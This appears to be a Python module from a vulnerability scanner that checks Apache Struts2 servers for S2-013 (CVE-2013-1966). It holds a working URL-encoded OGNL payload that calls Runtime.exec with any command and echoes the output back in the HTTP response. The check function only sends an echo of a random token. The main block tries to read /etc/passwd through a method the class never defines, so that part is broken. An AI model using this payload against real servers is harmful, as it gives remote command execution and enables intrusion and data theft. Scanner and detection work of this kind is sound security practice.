#!/usr/bin/env python3

from app.lib.request import request
from app.lib.encode import urlencode
from app.lib.common import get_capta, filter_str, get_useragent

class S2_013_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-013漏洞,又名CVE-2013-1966漏洞',
            'description': 'Struts2 S2-013漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.14.1',
            'date': '2013-04-16',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/link.action'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.payload = '?a=%24%7B%23_memberAccess%5B"allowStaticMethodAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27{cmd}%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'
                                                     
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_url = self.url + self.payload.format(cmd = urlencode('echo' + ' ' + self.capta))
            check_res = await request.get(check_url, headers = self.headers)
            check_str = filter_str(list(await check_res.text()))
            if check_res.status == 200 and len(check_str) < 100 and self.capta in check_str and len(check_str) < 100:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_013 = S2_013_BaseVerify('http://localhost:8080/s2_013_war_exploded/HelloWorld.action')
    S2_013.read('/etc/passwd')